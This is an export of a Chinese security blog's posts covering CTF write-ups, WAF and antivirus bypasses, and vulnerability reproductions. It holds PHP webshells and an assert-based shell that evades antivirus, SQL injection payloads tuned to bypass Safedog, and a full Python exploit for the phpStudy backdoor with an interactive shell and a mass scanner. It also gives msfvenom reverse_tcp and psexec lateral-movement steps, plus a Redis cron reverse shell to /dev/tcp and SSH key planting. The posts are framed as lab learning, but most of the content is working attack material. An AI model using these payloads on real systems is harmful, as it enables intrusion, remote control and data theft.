<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[过D]]></title>
    <url>%2F2019%2F11%2F26%2F%E8%BF%87D%2F</url>
    <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路,主要思路用的是一个比较偏的函数get_defined_functions 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt;]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019nctf wp(web,misc)]]></title>
    <url>%2F2019%2F11%2F24%2Fnctf%2F</url>
    <content type="text"><![CDATA[WEBFake XML cookbook题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 easyphp简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数不可以出现cat命令 解题思路:1.在传入换行符的时候,可以让/^$/匹配到(fuzz发现的),所以我们主要传入23333%0a就可以绕过第一关2.如果一个md5是0e开头且后面都是数字的2个md5进行弱类型比较的时候,会一样,因为strtr函数里面他回把c替换为0,所以我们只要找到ce开头的且后面都是数字的md5值就可以绕过3.在传入get参数时,如果参数包括.就会自动替换为_,因为我们传入的字符不可以大于8并且不可以用cat命令,那么我们可以用tac(查看内容并且进行反转)代替cat,然后我们可以用通配符*来减短长度 绕过第一关传入参数num=23333%0a 绕过第二关我们可以用脚本进行爆破md5值脚本 123456&lt;?phpfor($i=0;$i&lt;100000000000;$i++)&#123; if(preg_match("/^ce\d&#123;30&#125;$/",md5($i))) echo $i."\n";&#125;?&gt; 传入参数str1=586180707&amp;str2=1000766792 绕过第三我们要先查看flag文件在哪里,传入参数q.w.q=ls因为当前只有一个f开头的文件,所以我们可以用通配符*来绕过长度限制,传入参数q.w.q=tac f*然后在用linux把内容反过来,就可以拿到flag replace打开页面发现就是一个替换字符串的,然后在随便乱点是时候看到了一个hint.php刚开始看到还有点懵,然后在无意间在替换的时候,发现他报错了然后看到报错信息,有个preg_replace正则替换函数,然后上面php5.6就想到了,他应该是有用/e去匹配,然后有对替换的内容进行eval处理,导致命令执行 先执行一个phpinfo()然后执行命令的时候发现被拦截了然后通过fuzz发现,会过滤’号然后可以用eval($_GET[0]),这样来执行命令就不会出现单引号然后在根目录发现flag,然后查看即可 Upload your Shell题目说要找到上传点,然后在进行骚操作。点击头像发现,有image的字样。然后点进去发现上传点观察url发现,他有可能存在文件包含,然后试着去包含/etc/passwd能不能返回内容思路就是:上传个图片里面藏有一句话木马,然后利用文件包含去包含就可以了。 在正常上传图片的时候,发现竟然被拦截了通过他拦截信息可以知道,内容不可以用&lt;?的字符,有可能是图片中包含了这些字符所以被拦截了。我们可以只取图片的头部分然后在上传(只要把中间的大部分内容给删掉就可以了,如果还提示&lt;?拦截的消息就继续删),然后再次上传。发现他说,图片上传成功但是不可以获取到flag值,那我们在里面传入一句话木马就可以了,因为他过滤了&lt;?所以我们要用其他标签代替&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;代替。最终payload 1&lt;script language="php"&gt;eval($_REQUEST[0])&lt;/script&gt; 提示上传成功然后用文件包含去包含就可以拿到flag了 hacker_backdoor题目说:黑客写的一句话木马,然后我们要利用一句话木马去执行命令然后通过简单的审计,有2个条件1.要指定一个存在的目录2.不可以出现函数的字符串 其实绕过也很简单 ./目录这个代表当前文件,所以肯定是存在的 既然我们不可以传入函数字符串,那么我们可以对函数的字符串进行拆分,然后在执行(php有变量函数这种语法) 首页执行一个phpinfo命令,传入如下payload$a=&#39;php&#39;;$a.=&#39;info&#39;;$a();命令执行成功,但是通过disable_functions发现禁用了大部分命令执行函数,和其他文件操作的函数,但是经过黑名单对比,发现了漏了一个命令执行函数proc_open(),然后查看别人使用方法 1234567891011&lt;?php $test = "whoami"; $array =array( array("pipe","r"), //标准输入 array("pipe","w"), //标准输出内容 array("pipe","w") //标准输出错误 ); $fp = proc_open($test,$array,$pipes); //打开一个进程通道 echo stream_get_contents($pipes[1]); //为什么是$pipes[1]，因为1是输出内容 proc_close($fp); 然后因为一些限制,例如array他不是一个函数所以就不可以用变量函数来代替,然后就替换为了[]来代替数组,还有echo也是一样,但是可以用print_r来代替。因为里面的一些变量和字符串也存在函数名,所以也要替换。最后修改后的payload 1234567891011121314151617&lt;?php$test = &quot;whoami&quot;;$p=&quot;pr&quot;;$p.=&apos;oc_&apos;;$p.=&apos;open&apos;;$ec=&quot;prin&quot;;$ec.=&quot;t_r&quot;;$s=&apos;st&apos;;$s.=&apos;r&apos;;$s.=&apos;eam&apos;;$s.=&apos;_ge&apos;;$s.=&apos;t_co&apos;;$s.=&apos;nten&apos;;$s.=&apos;ts&apos;;$array = [[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;r&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;]];$fp = $p($test,$array,$pes);$ec($s($pes[1])); 然后去掉换行符并且进行进行url编码最后变成 1$test%20=%20%22whoami%22;$p%20=%20%22pr%22;$p.=%27oc_%27;$p.=%27open%27;$ec=%22prin%22;$ec.=%22t_r%22;$s=%27st%27;$s.=%27r%27;$s.=%27eam%27;$s.=%27_ge%27;$s.=%27t_co%27;$s.=%27nten%27;$s.=%27ts%27;$array%20=%20[[%22p%22.%22i%22.%22pe%22,%22r%22],[%22p%22.%22i%22.%22pe%22,%22w%22],[%22p%22.%22i%22.%22pe%22,%22w%22]];$fp%20=%20$p($test,$array,$pes);$ec($s($pes[1])); 命令执行成功,然后在根目录发现flag,但是有个问题出现了,他的flag不可读但是还发现里面有个readflag,然后试着打开看看里面的内容他是一个elf可执行文件,然后在里面还有/bin/cat flag的字样,猜测他就是用来查看flag的,然后运行这个elf文件 MISCa_good_idea打开就是一张图片然后用binwalk进行分析发现了他内藏其他的图片,然后进行分离(加个-e)参数发现有个hint.txt查看后经过翻译后的内容是:试着找出像素的秘密然后用Stegsolve.jar进行分析,先打个第二个图片,用里面图片组合器,选择第一张图片进行处理然后点了几下按钮,发现了二维码,扫码拿flag What’s this里面是数据包,数据非常小,就是有个传了个压缩文件打开发现是密码,然后发现是伪加密,修改16进制位,把09标志位变成00(如果有些压缩软件说这不是一个有效的压缩包,就要把http头部内容删掉)然后查看里面的文件发现了一堆base64怀疑是base64隐写,利用别人的脚本进行解密,这里打开的是1.txt记得对文件重命名 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('1.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == '__main__': solve_stego() 结束感言nctf给我的感觉还是不错的,虽然总排名在69,但是比以前有点进步。至少不在是签到提选手了。没有白费这1个月天天刷ctf的时间。加油!加油!!!]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql过狗(联合注入)]]></title>
    <url>%2F2019%2F10%2F10%2Fsql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)%2F</url>
    <content type="text"><![CDATA[实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返回数据 那来用来测试是否可以绕过安全狗1&#39; or 1=1%23被拦截1&#39;/0%23没有被拦截,返回空1&#39;/1%23没有被拦截,返回数据 第二步猜测有多少个字段 1231&apos; order 不拦截1&apos; by 不拦截1&apos; order by 拦截 可以用/*!10244by*/,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用/*!10244order*/呢,因为我没有成功。:(输入a&#39; order /*!10244by*/3%23,发现没有拦截 然后查看有效字段 1231&apos; union 不拦截1&apos; select 不拦截1&apos; union select 拦截 可以用/*!1024select*/来绕过输入1&#39; union /*!10244select*/ 1,2,3%23,发现没有被拦截然后爆数据库,因为他会匹配database()函数,所以database/**/(),不过这样也会被拦截,在看404大佬的bypass的时候是用hex(database/**/())来得到数据库名的16进制的,不过我测试发现用(database/**/())就可以了利用hex获取数据库的16进制直接获取数据库名 获取数据库表的信息输入 11&apos; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=(database/**/()),3%23; 然后发现会被拦截,经过测试发现拦截的是information_schema这个关键字,我们可以加上``符号,来绕过 11&apos; union /*!10244select*/ 1,(select group_concat(table_name) from `information_schema`.tables where table_schema=(database/**/())),3%23 爆破列名 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;class&apos;),3%23 发现被拦截了,经过测试是在table_name=’class’这里被拦截,我们依然可以用``进行绕过。 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23 发现被拦截了,然后尝试吧class转换为hex在进行绕过 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=0x636c617373),3%23]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋ctf题目(1)]]></title>
    <url>%2F2019%2F10%2F09%2Fi%E6%98%A5%E7%A7%8Bctf(1)%2F</url>
    <content type="text"><![CDATA[百度杯CTF比赛 九月场(Upload)页面题目:页面写着可以你可以随意上传文件,那就上传一个普通的一句话木马 12&lt;?phpeval($_REQUEST['a']); 发现上传成功,然后点击上传成功发现没有解析,猜测有可能是过滤了php这个字符串,换成短标签试一下 123&lt;?eval($_REQUEST['a']);?&gt; 发现也没有被解析怀疑还有可能过滤了&lt;?符号,不过还可以用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;,不过php被过滤了,可以换成PhP 123&lt;script language="PhP"&gt; eval($_REQUEST['a']);&lt;/script&gt; 空白页面,php有可能解析了,然后用蚁剑连接。连接成功,也找到了flag。 百度杯CTF比赛 九月场(Code)题目页面查看url,有可能是文件包含,然后右键查看源代码,发现结果base64加密尝试输入index.php,看看会不会被包含发现成功包含了,然后用base64去解密,代码如下:从代码的注释中发现了PhpStorm,所以怀疑是文件泄露发现返回了页面,在页面中发现了其他php文件(fl3g_ichuqiu.php,index.php,config.php)然后想这利用文件包含来包含fl3g_ichuqiu.php这个文件,可是因为index.php的正则不允许有任何的符号,但是他会把config转换为_这个符号所以构造这样的payload:fl3gconfigichuqiu.php然后进行base64解码,得到源码(代码比较多,就不截图了,直接贴出来) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');# 此函数用来获取随机的字符串function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') &#123; $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125;# 此函数是一个加密函数function encrypt($txt,$key)&#123; # 此循环用来把每个字符转换为ascii码然后+10然后在变成字符 for($i=0;$i&lt;strlen($txt);$i++)&#123; $tmp .= chr(ord($txt[$i])+10); &#125; $txt = $tmp; # 获取4个随机字符 $rnd=random(4); # 将4个随机支付与$key进行加密然后赋值给$key $key=md5($rnd.$key); $s=0; # 将$txt的每个字符与$key对应的字符进行加密。(如果$txt的长度是5,只会循环5次) for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; &#125; # 将生成的随机字符与生成的加密字符进行拼接然后base64加密,并且将值返回 return base64_encode($rnd.$ttmp);&#125;function decrypt($txt,$key)&#123; # 先将输入进来的值进行解密 $txt=base64_decode($txt); # 因为$txt是由随机字符和密文组合起来的 # 所以前面4个字符是随机字符,$rnd取出随机字符 $rnd = substr($txt,0,4); # $txt取出密文 $txt = substr($txt,4); # 将随机字符与$key拼接,在进行md5加密 $key=md5($rnd.$key); $s=0; # 因为加密进行了异或处理,因为异或是可逆的, # 所以$txt的每个字符与$key的每个字符进行异或就可以得到$tmp的值 for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; &#125; # 因为加密的时候对每个字符的ascii码进行了+10的操作 # 所以这里要将ascii码减10,在转换为字符 for($i=0;$i&lt;strlen($tmp);$i++)&#123; $tmp1 .= chr(ord($tmp[$i])-10); &#125; return $tmp1;&#125;# 对cookie里面的user这个值进行解密$username = decrypt($_COOKIE['user'],$key);# 如果解密的值是system则输出flagif ($username == 'system')&#123; echo $flag;&#125;else&#123; # 如果解密的信息不是system,则设置user的cookie,为guest加密后的内容 setcookie('user',encrypt('guest',$key)); echo "╮(╯▽╰)╭";&#125;?&gt; 在这个代码中,我们需要知道$key前6位的值,因为system长度为6所以在循环加密的时候,只会循环6次,所以知道$key的前面6位就可以了。然后else那个语句guest是5个字符,因为他是5个字符,所以可以通过这个来获取5个密文,还剩下1个密文就可以拿到flag了。解密代码 123456789101112131415161718192021222324252627282930313233343536373839#coding=utf-8# 1-14行通过异或得$key的前面5个字符guest = 'guest' # 对guest进行加密txt = ''# 对guest的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(guest)): txt += chr(ord(guest[i])+10)# guest加密后的值,从cookie中获取cookie_guest = "WFlSShVLCh8a"# 因为加密的最后一步是加密base64加密所以这里要解密cookie_guest = cookie_guest.decode('base64')# 获取验证码,加密后的内容是由4位验证码和密文rnd = cookie_guest[:4]# 获取密文ttmp = cookie_guest[4:]key = ''# 通过异或获得$key的前面5个字符for i in range(len(guest)): key += chr(ord(ttmp[i]) ^ ord(txt[i]))# 下面是对system进行加密system = 'system'txt1 = ''# 将system的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(system)): txt1 += chr(ord(system[i])+10)# 因为system是6位,需要6位的$key的内容,因为我们知道了$key的前面5个# 所以这里用来爆破,这里是1-f的原因是因为md5加密后的内容是1-fmd5 = '0123456789abcdef'new_key = ''# 然后对system进行加密for i in range(len(md5)): # 生成新的md5值 new_key = key+md5[i] cookie_system='' for j in range(len(system)): # 每个字符进行加密 cookie_system += chr(ord(txt1[j]) ^ ord(new_key[j])) flag = rnd + cookie_system print(flag.encode('base64').strip()) 然后把输出的值复制下来,然后用burp对cookie中的user进行爆破]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpsutdy后门复现]]></title>
    <url>%2F2019%2F09%2F24%2Fphpstudy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言phpstudy横空报出来了一个后门,通过网上的知道phpstudy2016、phpstudy2018的部分版本存在这个后门,请大家尽快修复此漏洞。(博主也中招,我的是php5.2.17和php5.4.45这2个版本) 漏洞利用攻击包如下 1234567891011GET /phpinfo.php HTTP/1.1Host: 172.16.80.119Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip,deflateaccept-charset:c3lzdGVtKCdjYWxjJyk7Accept-Language: zh-CN,zh;q=0.9Connection: close 其中主要是修改Accept-Encoding和添加accept-charset这2个头文件,Accept-Encoding这个头文件中gzip,deflate这2个单词中间后面不可以有空格。然后accept-charset这个头文件传输的是payload,pyaload是结果php的代码在加上base64加密发送 工具小菜鸡一般的我,写了一个简单的脚本。大佬们勿喷!!!,只支持python3!!!脚本如果有问题记得联系本人QQ:2804745224 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#author:错空#time: 2019-09-24import threadingimport requestsimport base64import reimport optparse&quot;&quot;&quot;此函数是用来弄一个交互式的shell的参数是目标的网站和执行的cmd命令&quot;&quot;&quot;def exp(url,cmd): cmd =&quot;echo &apos;&lt;iclby&gt;&apos;;system(&apos;&quot;+cmd+&quot;&apos;);echo &apos;&lt;/iclby&gt;&apos;;&quot; #设置payload,加一个自定义标签是为了后面正则容易匹配命令执行后的结果 cmd = base64.b64encode(cmd.encode(&apos;utf-8&apos;)) #对payload进行加密 header=&#123; #设置http头 &quot;accept-charset&quot;: cmd, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; url = url #设置目标 try: response = requests.get(url,headers=header, timeout=10,verify=False) except: print(&quot;[-]网站访问超时!!!&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态码不是200&quot;) exit(0) r = re.compile(&quot;&lt;iclby&gt;(.*?)&lt;/iclby&gt;&quot;,re.S) #创建正则,为了匹配执行后的命令 result = re.search(r, response.text) if(result!=None): #判断返回后的命令函数是否为空 print(result.group(1).strip()) else: poc(url) #如果没有成功就调用漏洞验证的函数 exit(0)&quot;&quot;&quot;此函数是用来漏洞验证只有一个参数,用来接收目标网址&quot;&quot;&quot;def poc(url): url = url.strip() #因为要读取文件,为了保险起见去除空格,以保证准确性 header=&#123; #设置http头 &quot;accept-charset&quot;: &quot;ZWNobyAnaWxjYnloYWhhJzs=&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: response = requests.get(url, headers=header, timeout=5) except: print(&quot;[-]网站超时&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态吗不是200&quot;) exit(0) text = response.text r = re.compile(&quot;ilc.*?yhaha&quot;,re.S) if(re.search(r,text)): print(&quot;[+]%s:存在php后门漏洞!&quot;%url) else: print(&quot;[-]不存在php后门漏洞!&quot;)def main(): parser = optparse.OptionParser(&quot;[*]Usage: 验证是否有漏洞-s加目标,漏洞利用-e加目标(exit退出交互),-f漏洞扫描,扫描文件&quot;) parser.add_option(&quot;-s&quot;,dest=&quot;scan&quot;,type=&quot;string&quot;,help=&quot;扫描是否存在漏洞&quot;) parser.add_option(&quot;-e&quot;,dest=&quot;shell&quot;,type=&quot;string&quot;,help=&quot;漏洞利用,交互式shell&quot;) parser.add_option(&quot;-f&quot;,dest=&quot;file&quot;,type=&quot;string&quot;,help=&quot;扫描文件里面的ip是否存在漏洞&quot;) (options, args) = parser.parse_args() scan = options.scan shell = options.shell d = options.file if(scan!=None): poc(scan) elif(shell!=None): result = input(&quot;请输入要执行的命令:\n&gt;&gt;&gt;&quot;) while(result != &quot;exit&quot;): exp(shell,result) result = input(&quot;&gt;&gt;&gt;&quot;) elif(d!=None): try: with open(d,&apos;r&apos;) as f: for i in f: threading.Thread(target=poc,args=(i,)).start() except FileNotFoundError: print(&quot;文件不存在,或者权限不够&quot;) else: print(parser.usage) main() 参考文章https://mp.weixin.qq.com/s/VuaJhp7vRkzEiE_8-6ecqA]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2019-07-08]]></title>
    <url>%2F2019%2F09%2F08%2Fcve-2019-2708%2F</url>
    <content type="text"><![CDATA[试验环境exp下载:链接：https://pan.baidu.com/s/1ZdsFNikHnj73pMNVXpxf2Q 提取码：f58vhttps://github.com/rapid7/metasploit-framework/pull/12283/fileswidnow7靶机下载ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/Window7 sp1 IP:172.16.5.68kali msf(5.0.32) IP:172.16.5.88 拷贝exp,把利用代码拷贝到对应的文件,命令如下(如果目标已有文件,直接覆盖就可以了): 12345mv rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/mv rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mv cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/mv cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/ 然后运行msf如果遇到如下错误,就更新msf 开始试验use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset RHOSTS 172.16.5.68set LHOSTS 172.16.5.88set target 3exploit如果不成功多试验几次，可以改target的值如果报如下错误(那就自求多福了),说不定是网络问题。如果报如下错误,有可能是目录弄错了 server2008还在苦苦挣扎(蓝屏盖中盖) 参考链接https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=timeline&amp;isappinstalled=0http://www.nmd5.com/?p=409&amp;from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPC简单攻击]]></title>
    <url>%2F2019%2F09%2F01%2FIPC%24%E5%85%A5%E4%BE%B5%2F</url>
    <content type="text"><![CDATA[IPC$攻击与目标建立远程连接: 1net use \\172.16.5.1\ipc$ /u:administrator abc.123 利用msf生成后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.23 LPORT=777 -f exe &gt;&gt; ppp.exe 然后利用copy命令把木马放到目标(c$代表是c盘的意思) 1copy C:\ppp.exe \\172.16.5.1\c$ 设置msf监听 123set lhost 172.16.5.23 //设置监听的ipset lport 777 //设置监听的端口exploit //开始监听 查看目标时间(后面设置定时任务要用) 1net time \\172.16.5.1 设置定时任务 1at \\172.16.5.1 11:22 C:\ppp.exe //11:22是自己设置什么时候运行 C:\ppp.exe是运行的文件 等到设定的时间就会运行文件 使用psexec工具安装下载地址: https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec下载完成后直接把工具复制到cmd的目录下第一次运行时候弹出一个框点击access就可以了 msf设置监听与上面一样然后运行命令: 1psexec \\172.16.5.1 -u administrator -p abc.123 -c c:\ppp.exe -u:用户名-p:密码-c:本地的文件作用:把本地文件复制到目标然后运行(如果已有IPC连接可以不用-u和-p参数) 推荐文章https://blog.csdn.net/u010984552/article/details/54890187https://www.cnblogs.com/baocheng/p/4020685.html?utm_source=tuicool&amp;utm_medium=referral]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>IPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8/28(redis未授权,xctf)]]></title>
    <url>%2F2019%2F08%2F28%2Fredis%2F</url>
    <content type="text"><![CDATA[漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make 步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptables stop # 防止后面因为防火墙的原因连接不了redis$ cd src$ ./redis-server ../redis.conf #可以省略后面的../redis.conf,这样的话就是默认配置 启动页面如图: 攻击机也要安装redis和步骤1一样(不用做步骤2) 如果没有安装成功可以参考此文章 然后测试一下远程连接,在攻击远程目标的redis 1$ ./redis-cli -h 172.16.5.55 如图表示连接成功: 如果没有连接成功有可能是因为bind或者设置了密码设置成了127.0.0.1,可以更改配置文件 1$ vi redis.conf 可以在前面添加一个#或者把127.0.0.1改为0.0.0.0 如图: 在requirepass添加注释 如图: 漏洞利用ssh无密码连接 讲一下ssh无密码连接的思路 1.生成ssh公钥 2.把ssh公钥传入redis缓存里面 3.修改ssh公钥 4.把redis缓存修改为/root/.ssh/ 首先用nmap工具对目标进行扫描 画箭头那里Bind是0.0.0.0表示任意ip都可以连接 我们先生成一个ssh公钥 1$ ssh-keygen -t rsa 修改ssh公钥(为了防止公钥与其他数据连接在一起) 1(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt 把key.txt添加到缓冲区 1$ cat /root/key.txt | ./redis-cli -h 172.16.5.55 -x set xxx 远程连接redis然后修改配置,然后输入如下命令 1234$ ./redis-cli -h 172.16.5.55$ config set dir /root/.ssh$ config set dbfilename authorized_keys$ save 最后连接目标服务器 如果目标是存在弱密码的我们可以用hydra进行爆破先为目标设置一个密码: 1vi redis.conf 按照如下修改然后用hydra进行爆破hydra -P pass.txt redis://172.16.5.55还可以用msf进行爆破爆破成功得到密码后就可以连接了 nc反弹shell思路与上面相同更改redis存储的文件 具体命令如下先用nc监听端口远程连接redis进行配置 1234set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.5.23/666 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过1分钟左右就可以看到shell已经反弹过来了 xctf(web)篇php2发现什么都没有,然后有工具来了一波爆破看到了个index.phps文件,然后访问看看发现了代码泄露,通过审计发现要满足以下条件才可以拿到flag 121.$_GET[&apos;id&apos;]!==&quot;admin&quot;2.$_GET[&apos;id&apos;]===&quot;admin&quot; 这样看起来很绕,他第一次判断是否等于admin,如果等于就输出并且退出,然后中间那里有一个urldecode(),然后在判断是否大于admin如果等于的话就输出flag。所以所有的关键就在urldecode()这个函数,这个函数是用来url解码的。所以我们可以对admin进行一次urldecode然后我们只用把a变成%61然后对%61进行编码就可以绕过了(因为浏览器默认会进行一次url编码,所以我们这里还要编码一次) unserialize3题目页面:看到class类和wakeup就想到了反序列化漏洞,__wakeup会在反序列化的时候执行他里面的代码,所以要想办法绕过wakeup这里,然后wakeup有一个漏洞就是在反序列化时他的对象属性个数的值大于真实个数的属性就会跳过wakeup去执行。例如:O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:4:&quot;test&quot;;}我们把1改成2他就会跳过__wakeup。因为括号里面只有1个属性,但是我们在外面说有2个属性所以他就会跳过这样题目就很简单了先对代码进行序列化得到O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后把属性1变成属性2最后的payload是:O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后提交得到flag 一些好的文章c2:https://github.com/platdrag/UnblockableChainshttps://iwantmore.pizza/posts/dnscat2-over-doh.htmlhttps://www.freebuf.com/sectool/210450.html 面试技巧:https://github.com/FeeiCN/SecurityInterviewQuestions ThinkPHP漏洞:https://github.com/Mochazz/ThinkPHP-Vuln/ 工具:https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>redis未授权</tag>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wfuzz工具]]></title>
    <url>%2F2019%2F08%2F28%2Fwfuzz%2F</url>
